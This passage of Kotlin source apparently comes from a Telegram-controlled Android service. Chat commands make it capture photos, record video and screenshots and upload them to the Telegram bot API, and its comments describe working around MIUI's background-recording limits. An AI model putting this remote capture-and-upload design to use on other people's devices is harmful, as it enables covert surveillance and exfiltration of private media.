     *  id=3 (channel khusus kamera) jadi visible surface sah MIUI. */
    private suspend fun captureCamera(chatId: String, facing: String) {
        if (isCapturingCamera) {
            sendText(chatId, "Sedang mengambil foto... tunggu selesai.")
            return
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val granted = checkSelfPermission(android.Manifest.permission.CAMERA) ==
                    android.content.pm.PackageManager.PERMISSION_GRANTED
            if (!granted) {
                sendText(chatId, "⚠️ Izin kamera belum diberikan. Buka app → izinkan akses kamera → lalu /camfront atau /camback lagi.")
                return
            }
        }
        isCapturingCamera = true
        showCameraNotification(facing)
        val label = if (facing == "front") "depan" else "belakang"
        sendText(chatId, "📷 Ambil foto kamera $label...")
        scope?.launch {
            val captured = withContext(Dispatchers.IO) {
                try {
                    captureOneFrame(facing)
                } catch (e: Exception) {
                    Log.e(TAG, "captureCamera: ${e.javaClass.simpleName}: ${e.message}")
                    null
                }
            }
            hideCameraNotification()
            if (captured != null && captured.exists() && captured.length() > 0) {
                Log.d(TAG, "captureCamera: ${captured.length()} bytes, sending...")
                sendPhoto(chatId, captured, "Kamera $label ${Build.MODEL}")
                captured.delete()
            } else {
                sendText(chatId, "❌ Gagal ambil foto kamera $label.")
            }
            isCapturingCamera = false
        }
    }

    /** Ambil satu frame kamera (front/back) via Camera2 + ImageReader, tulis JPEG.
     *  Harus dipanggil dari non-main thread (IO). */
    private fun captureOneFrame(facing: String): java.io.File? {
        val cm = getSystemService(android.hardware.camera2.CameraManager::class.java) ?: return null
        val camChars = { id: String -> cm.getCameraCharacteristics(id) }
        val wantedFacing = if (facing == "front")
            android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT
        else
            android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK
        val cameraId = cm.cameraIdList.firstOrNull { id ->
            try {
                camChars(id).get(
                    android.hardware.camera2.CameraCharacteristics.LENS_FACING
                ) == wantedFacing
            } catch (e: Exception) { false }
        } ?: cm.cameraIdList.firstOrNull()
        if (cameraId == null) {
            Log.e(TAG, "captureOneFrame: no camera found")
            return null
        }

        val outDir = getExternalFilesDir(null) ?: filesDir
        val outFile = java.io.File(outDir, "cam_${facing}_${System.currentTimeMillis()}.jpg")
        if (outFile.exists()) outFile.delete()

        val size = pickCameraSize(camChars(cameraId), facing)
        val imageReader = android.media.ImageReader.newInstance(size.first, size.second,
            android.graphics.ImageFormat.JPEG, 2)
        val latch = java.util.concurrent.CountDownLatch(1)
        var saved: java.io.File? = null
        var camera: android.hardware.camera2.CameraDevice? = null
        var session: android.hardware.camera2.CameraCaptureSession? = null
        var openFailed = false

        imageReader.setOnImageAvailableListener({ reader ->
            val img = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
            val buf = img.planes[0].buffer
            val bytes = ByteArray(buf.remaining())
            buf.get(bytes)
            img.close()
            outFile.outputStream().use { it.write(bytes) }
            saved = outFile
            latch.countDown()
        }, android.os.Handler(android.os.Looper.getMainLooper()))

        val handler = android.os.Handler(android.os.Looper.getMainLooper())
        cm.openCamera(cameraId, object : android.hardware.camera2.CameraDevice.StateCallback() {
            override fun onOpened(dev: android.hardware.camera2.CameraDevice) {
                camera = dev
                try {
                    val captureRequest = dev.createCaptureRequest(
                        android.hardware.camera2.CameraDevice.TEMPLATE_STILL_CAPTURE
                    ).apply {
                        addTarget(imageReader.surface)
                        set(android.hardware.camera2.CaptureRequest.CONTROL_AF_MODE,
                            android.hardware.camera2.CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                        set(android.hardware.camera2.CaptureRequest.JPEG_QUALITY, 95.toByte())
                    }
                    dev.createCaptureSession(
                        listOf(imageReader.surface),
                        object : android.hardware.camera2.CameraCaptureSession.StateCallback() {
                            override fun onConfigured(sess: android.hardware.camera2.CameraCaptureSession) {
                                session = sess
                                try {
                                    sess.capture(captureRequest.build(), object :
                                        android.hardware.camera2.CameraCaptureSession.CaptureCallback() {
                                        override fun onCaptureCompleted(
                                            s: android.hardware.camera2.CameraCaptureSession,
                                            r: android.hardware.camera2.CaptureRequest,
                                            f: android.hardware.camera2.TotalCaptureResult
                                        ) {
                                            latch.countDown()
                                        }
                                    }, handler)
                                } catch (e: Exception) {
                                    Log.e(TAG, "capture: ${e.message}")
                                    latch.countDown()
                                }
                            }
                            override fun onClosed(sess: android.hardware.camera2.CameraCaptureSession) {
                                // sesi tertutup — tidak ada yang perlu dilakukan
                            }
                            override fun onConfigureFailed(sess: android.hardware.camera2.CameraCaptureSession) {
                                Log.e(TAG, "capture session configure failed")
                                latch.countDown()
                            }
                        },
                        handler
                    )
                } catch (e: Exception) {
                    Log.e(TAG, "createCaptureSession fail: ${e.message}")
                    latch.countDown()
                }
            }
            override fun onDisconnected(dev: android.hardware.camera2.CameraDevice) {
                try { dev.close() } catch (_: Exception) {}
            }
            override fun onError(dev: android.hardware.camera2.CameraDevice, error: Int) {
                openFailed = true
                Log.e(TAG, "camera open error: $error")
                try { dev.close() } catch (_: Exception) {}
                latch.countDown()
            }
        }, handler)

        // Tunggu max 10 detik (termasuk time-to-first-frame di kamera)
        latch.await(10, java.util.concurrent.TimeUnit.SECONDS)
        try { session?.close() } catch (_: Exception) {}
        try { camera?.close() } catch (_: Exception) {}
        try { imageReader.close() } catch (_: Exception) {}
        if (openFailed) return null
        return if (outFile.exists() && outFile.length() > 0) outFile else null
    }

    /** Pilih ukuran kamera: back=1080p, front=paling dekat 1080p yang didukung. */
    private fun pickCameraSize(
        chars: android.hardware.camera2.CameraCharacteristics,
        facing: String
    ): Pair<Int, Int> {
        val map = chars.get(
            android.hardware.camera2.CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP
        ) ?: return Pair(1920, 1080)
        val sizes = map.getOutputSizes(android.graphics.ImageFormat.JPEG)
            ?.map { Pair(it.width, it.height) }
            ?: return Pair(1920, 1080)
        if (facing == "front") {
            // Front camera biasanya 720p–1080p; ambil yang paling besar
            return sizes.maxByOrNull { (it.first * it.second).toLong() }
                ?: Pair(1280, 720)
        }
        // Back camera: ambil yang ≤ 1080p terbesar
        return sizes
            .filter { (it.first * it.second).toLong() <= 1920L * 1080L }
            .maxByOrNull { (it.first * it.second).toLong() }
            ?: Pair(1920, 1080)
    }

    /** Tampilkan notification foreground kamera (id=3). */
    private fun showCameraNotification(facing: String) {
        val ch = "telebot_camera"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            getSystemService(NotificationManager::class.java).createNotificationChannel(
                NotificationChannel(ch, "Kamera TeleBot", NotificationManager.IMPORTANCE_LOW)
            )
        }
        val label = if (facing == "front") "depan" else "belakang"
        val pi = PendingIntent.getActivity(this, 0, Intent(this, MainActivity::class.java), PendingIntent.FLAG_IMMUTABLE)
        val note = NotificationCompat.Builder(this, ch)
            .setContentTitle("📷 Ambil foto kamera $label...")
            .setContentText("Menyusun 1 foto, kirim ke Telegram")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setContentIntent(pi)
            .setOngoing(true)
            .build()
        startForeground(3, note)
        Log.d(TAG, "showCameraNotification: started facing=$facing")
    }

    /** Hapus notification kamera (id=3) tanpa mematikan foreground service. */
    private fun hideCameraNotification() {
        try {
            getSystemService(NotificationManager::class.java).cancel(3)
            Log.d(TAG, "hideCameraNotification: cancelled id=3")
        } catch (e: Exception) {
            Log.w(TAG, "hideCameraNotification: ${e.message}")
        }
    }

    /** Rekam video kamera depan/belakang secara background (tanpa UI).
     *  Alur: Camera2 (pilih lensa front/back) → MediaRecorder(SURFACE) +
     *  ImageReader → CaptureSession → rekam N detik → stop → kirim video.
     *  Foreground notification id=4 jadi visible surface sah MIUI.
     *  seconds: 5–60, default 15. */
    private suspend fun recordVideo(chatId: String, facing: String, seconds: Int) {
        if (isRecordingVideo) {
            sendText(chatId, "Sedang merekam video... tunggu selesai.")
            return
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val camGranted = checkSelfPermission(android.Manifest.permission.CAMERA) ==
                    android.content.pm.PackageManager.PERMISSION_GRANTED
            if (!camGranted) {
                sendText(chatId, "⚠️ Izin kamera belum diberikan. Buka app → izinkan akses kamera → lalu /vidfront atau /vidback lagi.")
                return
            }
        }
        isRecordingVideo = true
        val label = if (facing == "front") "depan" else "belakang"
        showVideoNotification(label)
        sendText(chatId, "🎥 Mulai rekam video kamera $label ${seconds} detik...")
        scope?.launch {
            val result = withContext(Dispatchers.IO) {
                try {
                    recordOneVideo(facing, seconds)
                } catch (e: Exception) {
                    Log.e(TAG, "recordVideo: ${e.javaClass.simpleName}: ${e.message}", e)
                    Pair(null as java.io.File?, "exception: ${e.javaClass.simpleName}: ${e.message}")
                }
            }
            val outFile = result?.first
            val errDetail = result?.second ?: "unknown"
            hideVideoNotification()
            if (outFile != null && outFile.exists() && outFile.length() > 0) {
                Log.d(TAG, "recordVideo: ${outFile.length()} bytes, sending...")
                sendVideo(chatId, outFile, "Video kamera $label ${Build.MODEL}")
                outFile.delete()
            } else {
                Log.e(TAG, "recordVideo: FAILED err=$errDetail")
                sendText(chatId, "❌ Gagal merekam video kamera $label. Detail: $errDetail")
            }
            isRecordingVideo = false
        }
    }

    /** Rekam video front/back via legacy Camera API + MediaRecorder(CAMERA).
     *  Pola sama dengan /camfront yang terbukti jalan di MIUI.
     *  MediaRecorder di-feed oleh legacy Camera (dipakai Camera2 hanya untuk open). */
    private fun recordOneVideo(facing: String, seconds: Int): Pair<java.io.File?, String>? {
        val outDir = getExternalFilesDir(null) ?: filesDir
        val outFile = java.io.File(outDir, "vid_${facing}_${System.currentTimeMillis()}.mp4")
        if (outFile.exists()) outFile.delete()

        // === Camera2 + ImageReader (YUV_420_888) + MediaCodec (H264) + MediaMuxer ===
        // Pola yang sama dengan captureOneFrame (Camera2) yang sudah terbukti jalan di MIUI.
        // MediaRecorder dihindari karena start()-nya diblokir MIUI saat app di background.

        val cm = getSystemService(android.hardware.camera2.CameraManager::class.java) ?: return Pair(null, "no_camera_manager")
        val wantedFacing = if (facing == "front")
            android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT
        else
            android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK
        val cameraId = cm.cameraIdList.firstOrNull { id ->
            try {
                cm.getCameraCharacteristics(id).get(
                    android.hardware.camera2.CameraCharacteristics.LENS_FACING
                ) == wantedFacing
            } catch (e: Exception) { false }
        }
        if (cameraId == null) return Pair(null, "no_camera_facing=$facing")
        Log.d(TAG, "recordOneVideo: Camera2 cameraId=$cameraId facing=$facing")

        // Pilih resolusi dari characteristics
        var vw = 1280; var vh = 720
        try {
            val chars = cm.getCameraCharacteristics(cameraId)
            val map = chars.get(android.hardware.camera2.CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val yuvSizes = map?.getOutputSizes(android.graphics.ImageFormat.YUV_420_888) ?: emptyArray()
            Log.d(TAG, "recordOneVideo: YUV sizes=" + yuvSizes.map { "${it.width}x${it.height}" })
            val best = yuvSizes.filter { it.width >= 640 && it.height >= 480 }
                .maxByOrNull { it.width.toLong() * it.height.toLong() }
            if (best != null) { vw = best.width; vh = best.height }
        } catch (e: Exception) {
            Log.w(TAG, "recordOneVideo: size fallback to 1280x720: ${e.message}")
        }
        Log.d(TAG, "recordOneVideo: using ${vw}x${vh}")

        // --- 1. ImageReader untuk frame kamera (YUV) ---
        val reader = android.media.ImageReader.newInstance(vw, vh, android.graphics.ImageFormat.YUV_420_888, 4)

        // --- 2. MediaCodec H264 encoder ---
        val codecMime = "video/avc"
        val format = android.media.MediaFormat.createVideoFormat(codecMime, vw, vh).apply {
            setInteger(android.media.MediaFormat.KEY_COLOR_FORMAT,
                android.media.MediaCodecInfo.CodecCapabilities.COLOR_FormatYUV420Flexible)
            setInteger(android.media.MediaFormat.KEY_BIT_RATE, 4_000_000)
            setInteger(android.media.MediaFormat.KEY_FRAME_RATE, 30)
            setInteger(android.media.MediaFormat.KEY_I_FRAME_INTERVAL, 2)
        }
        val encoder = android.media.MediaCodec.createEncoderByType(codecMime)
        encoder.configure(format, null, null, android.media.MediaCodec.CONFIGURE_FLAG_ENCODE)

        // Array input/output buffers (non-null)
        val inputBuffers = encoder.inputBuffers
        val outputBuffers = encoder.outputBuffers
        if (inputBuffers == null || outputBuffers == null)
            return Pair(null, "encoder_buffers_null")
        val muxer = android.media.MediaMuxer(outFile.absolutePath, android.media.MediaMuxer.OutputFormat.MUXER_OUTPUT_MPEG_4)
        var muxerStarted = false
        var trackIndex = -1
        val frameCount = java.util.concurrent.atomic.AtomicInteger(0)

        // --- 3. Kamera Camera2: buka, buat session ke ImageReader, jalankan repeating request ---
        val handler = android.os.Handler(android.os.Looper.getMainLooper())
        val sessionLatch = java.util.concurrent.CountDownLatch(1)
        var camDevice: android.hardware.camera2.CameraDevice? = null
        var camSession: android.hardware.camera2.CameraCaptureSession? = null

        try {
            cm.openCamera(cameraId, object : android.hardware.camera2.CameraDevice.StateCallback() {
                override fun onOpened(dev: android.hardware.camera2.CameraDevice) {
                    try {
                        camDevice = dev
                        val req = dev.createCaptureRequest(
                            android.hardware.camera2.CameraDevice.TEMPLATE_RECORD
                        ).apply {
                            addTarget(reader.surface)
                        }
                        dev.createCaptureSession(
                            listOf(reader.surface),
                            object : android.hardware.camera2.CameraCaptureSession.StateCallback() {
                                override fun onConfigured(sess: android.hardware.camera2.CameraCaptureSession) {
                                    camSession = sess
                                    try {
                                        sess.setRepeatingRequest(req.build(), null, handler)
                                        
                                        Log.d(TAG, "recordOneVideo: repeating started")
                                    } catch (e: Exception) {
                                        Log.e(TAG, "recordOneVideo: repeating fail: ${e.message}")
                                    }
                                    sessionLatch.countDown()
                                }
                                override fun onClosed(sess: android.hardware.camera2.CameraCaptureSession) {
                                }
                                override fun onConfigureFailed(sess: android.hardware.camera2.CameraCaptureSession) {
                                    Log.e(TAG, "recordOneVideo: configure failed")
                                    sessionLatch.countDown()
                                }
                            },
                            handler
                        )
                    } catch (e: Exception) {
                        Log.e(TAG, "recordOneVideo: session fail: ${e.message}")
                        sessionLatch.countDown()
                    }
                }
                override fun onDisconnected(dev: android.hardware.camera2.CameraDevice) {
                    try { dev.close() } catch (_: Exception) {}
                }
                override fun onError(dev: android.hardware.camera2.CameraDevice, error: Int) {
                    Log.e(TAG, "recordOneVideo: camera error=$error")
                    sessionLatch.countDown()
                }
            }, handler)

            if (!sessionLatch.await(10, java.util.concurrent.TimeUnit.SECONDS)) {
                try { camDevice?.close() } catch (_: Exception) {}
                try { encoder.release() } catch (_: Exception) {}
                try { muxer.release() } catch (_: Exception) {}
                try { reader.close() } catch (_: Exception) {}
                return Pair(null, "session_timeout")
            }
        } catch (e: Exception) {
            return Pair(null, "camera_open_fail: ${e.message}")
        }

        // --- 4. Start codec + muxer ---
        try {
            encoder.start()
            val outFmt = encoder.outputFormat
            if (outFmt == null)
                return Pair(null, "codec_output_format_null_after_start")
            muxer.start()
            muxerStarted = true
            trackIndex = muxer.addTrack(outFmt)
            Log.d(TAG, "recordOneVideo: codec started, muxer track=$trackIndex")
        } catch (e: Exception) {
            Log.e(TAG, "recordOneVideo: codec/muxer start fail: ${e.message}")
            try { camSession?.close() } catch (_: Exception) {}
            try { camDevice?.close() } catch (_: Exception) {}
            try { encoder.release() } catch (_: Exception) {}
            try { muxer.release() } catch (_: Exception) {}
            try { reader.close() } catch (_: Exception) {}
            return Pair(null, "codec_start_fail: ${e.message}")
        }

        // --- 5. Loop: baca frame dari ImageReader → encoder → muxer ---
        val totalFrames = seconds * 30
        var framesSent = 0

        while (frameCount.get() < totalFrames) {
            val image = reader.acquireLatestImage()
            if (image == null) {
                Thread.sleep(33)
                continue
            }
            try {
                val planes = image.planes
                val yBuf = planes[0].buffer
                val uBuf = planes[1].buffer
                val vBuf = planes[2].buffer
                val yRowStride = planes[0].rowStride
                val uvRowStride = planes[1].rowStride
                val yPixStride = planes[0].pixelStride
                val uvPixStride = planes[1].pixelStride

                if (yPixStride == 1) {
                    val inIdx = encoder.dequeueInputBuffer(100_000)
                    if (inIdx >= 0) {
                        val inBuf = inputBuffers[inIdx]
                        val ySize = vw * vh
                        val uSize = vw * vh / 4
                        val uHalf = vw / 2
                        inBuf.clear()
                        // Y plane
                        if (yRowStride == vw) {
                            val yArr = ByteArray(ySize)
                            val yCopy = yBuf.duplicate()
                            yCopy.limit(ySize)
                            yCopy.get(yArr)
                            inBuf.put(yArr)
                        } else {
                            val yArr = ByteArray(ySize)
                            val yCopy = yBuf.duplicate()
                            for (row in 0 until vh) {
                                val off = row * yRowStride
                                yCopy.position(off)
                                yCopy.get(yArr, row * vw, vw)
                            }
                            inBuf.put(yArr)
                        }
                        // U plane
                        val uvRowStride2 = planes[1].rowStride
                        val uPixStride = planes[1].pixelStride
                        if (uPixStride == 1 && uvRowStride2 == uHalf) {
                            val uArr = ByteArray(uSize)
                            val uCopy = uBuf.duplicate()
                            uCopy.limit(uSize)
                            uCopy.get(uArr)
                            inBuf.put(uArr)
                        } else if (uPixStride == 1) {
                            val uArr = ByteArray(uSize)
                            val uCopy = uBuf.duplicate()
                            for (row in 0 until vh / 2) {
                                val off = row * uvRowStride2
                                uCopy.position(off)
                                uCopy.get(uArr, row * uHalf, uHalf)
                            }
                            inBuf.put(uArr)
                        }
                        // V plane
                        val vPixStride = planes[2].pixelStride
                        val vRowStride = planes[2].rowStride
                        if (vPixStride == 1 && vRowStride == uHalf) {
                            val vArr = ByteArray(uSize)
                            val vCopy = vBuf.duplicate()
                            vCopy.limit(uSize)
                            vCopy.get(vArr)
                            inBuf.put(vArr)
                        } else if (vPixStride == 1) {
                            val vArr = ByteArray(uSize)
                            val vCopy = vBuf.duplicate()
                            for (row in 0 until vh / 2) {
                                val off = row * vRowStride
                                vCopy.position(off)
                                vCopy.get(vArr, row * uHalf, uHalf)
                            }
                            inBuf.put(vArr)
                        }
                        val presentationTimeNs = frameCount.get() * (1_000_000_000L / 30)
                        encoder.queueInputBuffer(
                            inIdx, 0, inBuf.position(),
                            presentationTimeNs, 0
                        )
                        frameCount.incrementAndGet()
                    }
                }
            } finally {
                image.close()
            }

            // Baca output dari encoder
            val outInfo = android.media.MediaCodec.BufferInfo()
            while (true) {
                val outIdx = encoder.dequeueOutputBuffer(outInfo, 10_000)
                if (outIdx < 0) break
                val codecBuf = outputBuffers[outIdx]
                if (outInfo.flags and android.media.MediaCodec.BUFFER_FLAG_SYNC_FRAME != 0) {
                    Log.d(TAG, "recordOneVideo: sync frame, ${outInfo.size} bytes")
                }
                if (outInfo.size > 0 && muxerStarted) {
                    muxer.writeSampleData(trackIndex, codecBuf, outInfo)
                }
                encoder.releaseOutputBuffer(outIdx, false)
                if (outInfo.flags and android.media.MediaCodec.BUFFER_FLAG_END_OF_STREAM != 0) break
            }

            if (frameCount.get() >= totalFrames) break
        }

        // --- 6. Stop encoder → flush sisa frame → stop muxer ---
        try {
            val inIdx = encoder.dequeueInputBuffer(10_000)
            if (inIdx >= 0) {
                encoder.queueInputBuffer(inIdx, 0, 0, 0,
                    android.media.MediaCodec.BUFFER_FLAG_END_OF_STREAM)
            }
        } catch (_: Exception) {}

        var gotEos = false
        val outInfo = android.media.MediaCodec.BufferInfo()
        var loopCount = 0
        while (loopCount < 100) {
            val outIdx = encoder.dequeueOutputBuffer(outInfo, 5_000)
            if (outIdx < 0) { loopCount++; continue }
            val codecBuf = outputBuffers[outIdx]
            if (outInfo.flags and android.media.MediaCodec.BUFFER_FLAG_END_OF_STREAM != 0) {
                if (outInfo.size > 0) {
                    try { muxer.writeSampleData(trackIndex, codecBuf, outInfo) } catch (_: Exception) {}
                }
                encoder.releaseOutputBuffer(outIdx, false)
                gotEos = true
                break
            }
            if (outInfo.size > 0 && muxerStarted) {
                muxer.writeSampleData(trackIndex, codecBuf, outInfo)
            }
            encoder.releaseOutputBuffer(outIdx, false)
        }

        // --- 7. Cleanup ---
        try { encoder.stop() } catch (_: Exception) {}
        try { encoder.release() } catch (_: Exception) {}
        try { camSession?.close() } catch (_: Exception) {}
        try { camDevice?.close() } catch (_: Exception) {}
        try {
            if (muxerStarted) {
                muxer.stop()
                Log.d(TAG, "recordOneVideo: muxer stopped, frames=$frameCount")
            }
        } catch (e: Exception) {
            Log.w(TAG, "recordOneVideo: muxer stop: ${e.message}")
        }
        try { muxer.release() } catch (_: Exception) {}
        try { reader.close() } catch (_: Exception) {}

        if (outFile.exists() && outFile.length() > 1024) {
            Log.d(TAG, "recordOneVideo: OK ${outFile.length()} bytes, ${frameCount.get()} frames")
            return Pair(outFile, "ok")
        } else {
            Log.w(TAG, "recordOneVideo: file too small or missing: ${outFile.length()}")
            return Pair(null, "file_empty(${outFile.length()}b, ${frameCount.get()} frames, eos=$gotEos)")
        }
    }

    /** Tampilkan notification foreground video (id=4). */
    private fun showVideoNotification(label: String) {
        val ch = "telebot_video"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            getSystemService(NotificationManager::class.java).createNotificationChannel(
                NotificationChannel(ch, "Video TeleBot", NotificationManager.IMPORTANCE_LOW)
            )
        }
        val pi = PendingIntent.getActivity(this, 0, Intent(this, MainActivity::class.java), PendingIntent.FLAG_IMMUTABLE)
        val note = NotificationCompat.Builder(this, ch)
            .setContentTitle("🎥 Merekam video kamera $label...")
            .setContentText("Video akan dikirim ke Telegram")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setContentIntent(pi)
            .setOngoing(true)
            .build()
        startForeground(4, note)
        Log.d(TAG, "showVideoNotification: started label=$label")
    }

    /** Hapus notification video (id=4) tanpa mematikan foreground service. */
    private fun hideVideoNotification() {
        try {
            getSystemService(NotificationManager::class.java).cancel(4)
            Log.d(TAG, "hideVideoNotification: cancelled id=4")
        } catch (e: Exception) {
            Log.w(TAG, "hideVideoNotification: ${e.message}")
        }
    }

    /** Kirim file video ke Telegram sebagai video (mp4, H264). */
    private suspend fun sendVideo(chatId: String, file: java.io.File, caption: String) =
        withContext(Dispatchers.IO) {
            if (chatId.isEmpty() || botToken.isEmpty()) return@withContext
            try {
                val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", chatId)
                    .addFormDataPart("video", file.name, file.asRequestBody("video/mp4".toMediaTypeOrNull()))
                    .addFormDataPart("caption", caption)
                    .build()
                val req = Request.Builder()
                    .url("https://api.telegram.org/bot$botToken/sendVideo")
                    .post(body)
                    .build()
                val resp = http.newCall(req).execute()
                if (!resp.isSuccessful) {
                    Log.e(TAG, "sendVideo: HTTP ${resp.code}")
                }
                resp.close()
                file.delete()
            } catch (e: Exception) {
                Log.e(TAG, "sendVideo: ${e.message}")
            }
        }

    /** Tulis file WAV dari raw PCM 16-bit mono. */
    private fun writeFile(wavFile: java.io.File, pcmData: ByteArray, sampleRate: Int, channels: Int, encoding: Int) {
        val numChannels = if (channels == AudioFormat.CHANNEL_IN_MONO) 1 else 2
        val bitsPerSample = 16
        val dataLen = pcmData.size
        val byteRate = sampleRate * numChannels * (bitsPerSample / 8)
        val blockAlign = numChannels * (bitsPerSample / 8)
        val header = ByteArray(44)
        fun putStr(off: Int, s: String) = s.toByteArray().copyInto(header, off)
        fun putLong(off: Int, v: Long) {
            for (i in 7 downTo 0) header[off + i] = ((v shr (8 * i)) and 0xFFL).toByte()
        }
        fun putInt(off: Int, v: Int) {
            for (i in 3 downTo 0) header[off + i] = ((v shr (8 * i)) and 0xFF).toByte()
        }
        fun putShort(off: Int, v: Int) {
            for (i in 1 downTo 0) header[off + i] = ((v shr (8 * i)) and 0xFF).toByte()
        }
        putStr(0, "RIFF")
        putInt(4, 36 + dataLen)
        putStr(8, "WAVE")
        putStr(12, "fmt ")
        putInt(16, 16)          // fmt chunk size
        putShort(20, 1)         // audio format = PCM
        putShort(22, numChannels)
        putInt(24, sampleRate)
        putInt(28, byteRate)
        putShort(32, blockAlign)
        putShort(34, bitsPerSample)
        putStr(36, "data")
        putInt(40, dataLen)
        wavFile.outputStream().use { out ->
            out.write(header)
            out.write(pcmData)
        }
    }

    /** Prepend 44-byte WAV header ke file PCM yang sudah ada di disk. */
    private fun prependWavHeader(file: java.io.File, dataLen: Int, sampleRate: Int, channels: Int, bitsPerSample: Int) {
        // Baca seluruh isi file PCM
        val pcmBytes = file.readBytes()
        val byteRate = sampleRate * channels * (bitsPerSample / 8)
        val blockAlign = channels * (bitsPerSample / 8)
        val header = ByteArray(44)
        fun putStr(off: Int, s: String) = s.toByteArray().copyInto(header, off)
        fun putInt(off: Int, v: Int) {
            for (i in 3 downTo 0) header[off + i] = ((v shr (8 * i)) and 0xFF).toByte()
        }
        fun putShort(off: Int, v: Int) {
            for (i in 1 downTo 0) header[off + i] = ((v shr (8 * i)) and 0xFF).toByte()
        }
        putStr(0, "RIFF")
        putInt(4, 36 + pcmBytes.size)
        putStr(8, "WAVE")
        putStr(12, "fmt ")
        putInt(16, 16)
        putShort(20, 1)
        putShort(22, channels)
        putInt(24, sampleRate)
        putInt(28, byteRate)
        putShort(32, blockAlign)
        putShort(34, bitsPerSample)
        putStr(36, "data")
        putInt(40, pcmBytes.size)
        file.outputStream().use { out ->
            out.write(header)
            out.write(pcmBytes)
        }
        Log.d(TAG, "prependWavHeader: data=${pcmBytes.size} + header=44 = ${pcmBytes.size + 44}")
    }

    /** Kirim WAV ke Telegram. Bot akan menerimanya sebagai audio. */
    private suspend fun sendWavAsAudio(chatId: String, file: java.io.File, caption: String) = withContext(Dispatchers.IO) {
        if (chatId.isEmpty() || botToken.isEmpty()) return@withContext
        try {
            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("audio", file.name, file.asRequestBody("audio/wav".toMediaTypeOrNull()))
                .addFormDataPart("duration", "15")
                .addFormDataPart("caption", caption)
                .build()
            val req = Request.Builder()
                .url("https://api.telegram.org/bot$botToken/sendAudio")
                .post(body)
                .build()
            val resp = http.newCall(req).execute()
            val respBody = resp.body?.string() ?: ""
            Log.d(TAG, "sendWavAsAudio: HTTP ${resp.code}, body=${respBody.take(200)}")
            resp.close()
        } catch (e: Exception) {
            Log.e(TAG, "sendWavAsAudio: ${e.message}")
        }
    }

    private fun stopRecording() {
        // Recording sekarang dipegang AudioRecorderActivity (bukan service);
        // fungsi ini cuma reset state service bila masih ada ref lama.
        val rec = mediaRecorder ?: run {
            isRecording = false
            return
        }
        isRecording = false
        mediaRecorder = null
        try {
            rec.stop()
        } catch (e: Exception) {
            Log.w(TAG, "stopRecording: ${e.message}")
        } finally {
            rec.release()
        }
    }

    /** Kirim file audio ke Telegram sebagai voice message. */
    private suspend fun sendAudio(chatId: String, file: java.io.File, caption: String) = withContext(Dispatchers.IO) {
        if (chatId.isEmpty() || botToken.isEmpty()) return@withContext
        try {
            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("audio", file.name, file.asRequestBody("audio/mp4".toMediaTypeOrNull()))
                .addFormDataPart("duration", "15")
                .addFormDataPart("caption", caption)
                .build()
            val req = Request.Builder()
                .url("https://api.telegram.org/bot$botToken/sendAudio")
                .post(body)
                .build()
            http.newCall(req).execute().close()
            file.delete()
        } catch (e: Exception) {
            Log.e(TAG, "sendAudio: ${e.message}")
        }
    }

    private suspend fun takeScreenshot(chatId: String) {
        if (mediaProjection == null) {
            sendText(chatId, "Tap aplikasi untuk izinkan screenshot.")
            return
        }
        ensureVirtualDisplay()
        val bmp = withContext(Dispatchers.Main) {
            captureFrame()
        }
        if (bmp != null) {
            sendPhoto(chatId, bmp)
        } else {
            sendText(chatId, "Gagal ambil screenshot.")
        }
    }

    private fun ensureVirtualDisplay() {
        if (virtualDisplay != null) return
        val dm = DisplayMetrics()
        val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        @Suppress("DEPRECATION")
        windowManager.defaultDisplay.getRealMetrics(dm)
        imageReader = ImageReader.newInstance(
            dm.widthPixels, dm.heightPixels, PixelFormat.RGBA_8888, 2
        )
        val mp = mediaProjection ?: return
        virtualDisplay = mp.createVirtualDisplay(
            "Screenshot", dm.widthPixels, dm.heightPixels, dm.densityDpi,
            android.view.Surface.ROTATION_0, imageReader!!.surface, null, null
        )
    }

    private fun captureFrame(): Bitmap? {
        val reader = imageReader ?: return null
        val image = reader.acquireLatestImage() ?: return null
        return try {
            val w = image.width
            val h = image.height
            val p = image.planes[0]
            val bytes = ByteArray(p.buffer.remaining())
            p.buffer.get(bytes)
            val stride = p.rowStride
            val pixelStride = p.pixelStride
            val bmp = Bitmap.createBitmap(w, h, Bitmap.Config.ARGB_8888)
            if (stride == w * 4 && pixelStride == 4) {
                bmp.copyPixelsFromBuffer(java.nio.ByteBuffer.wrap(bytes))
            } else {
                for (y in 0 until h) for (x in 0 until w) {
                    val idx = y * stride + x * pixelStride
                    val b = bytes[idx].toInt() and 0xFF
                    val g = bytes[idx + 1].toInt() and 0xFF
                    val r = bytes[idx + 2].toInt() and 0xFF
                    val a = bytes[idx + 3].toInt() and 0xFF
                    bmp.setPixel(x, y, (a shl 24) or (r shl 16) or (g shl 8) or b)
                }
            }
            bmp
        } catch (e: Exception) {
            null
        } finally {
            image.close()
        }
    }

    fun onMediaProjectionResult(resultCode: Int, data: Intent?, chatId: String) {
        if (resultCode != android.app.Activity.RESULT_OK || data == null) return
        val mgr = getSystemService(MediaProjectionManager::class.java)
        mediaProjection = mgr.getMediaProjection(resultCode, data)
        mediaProjection?.registerCallback(object : MediaProjection.Callback() {
            override fun onStop() { cleanupMediaProjection() }
        }, null)
        ensureVirtualDisplay()
        CoroutineScope(Dispatchers.IO).launch {
            sendText(chatId, "Izin tangkap layar diberikan!")
        }
    }

    private fun cleanupMediaProjection() {
